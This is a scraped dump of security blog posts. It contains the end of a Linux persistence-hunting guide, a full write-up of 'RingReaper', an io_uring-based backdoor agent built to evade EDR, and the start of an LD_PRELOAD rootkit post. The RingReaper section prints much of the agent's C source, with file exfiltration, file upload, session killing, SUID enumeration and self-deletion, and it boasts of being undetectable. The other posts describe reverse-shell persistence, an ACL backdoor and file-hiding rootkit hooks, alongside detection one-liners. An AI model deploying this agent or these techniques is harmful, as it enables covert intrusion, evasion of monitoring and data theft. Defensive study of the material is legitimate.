Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to 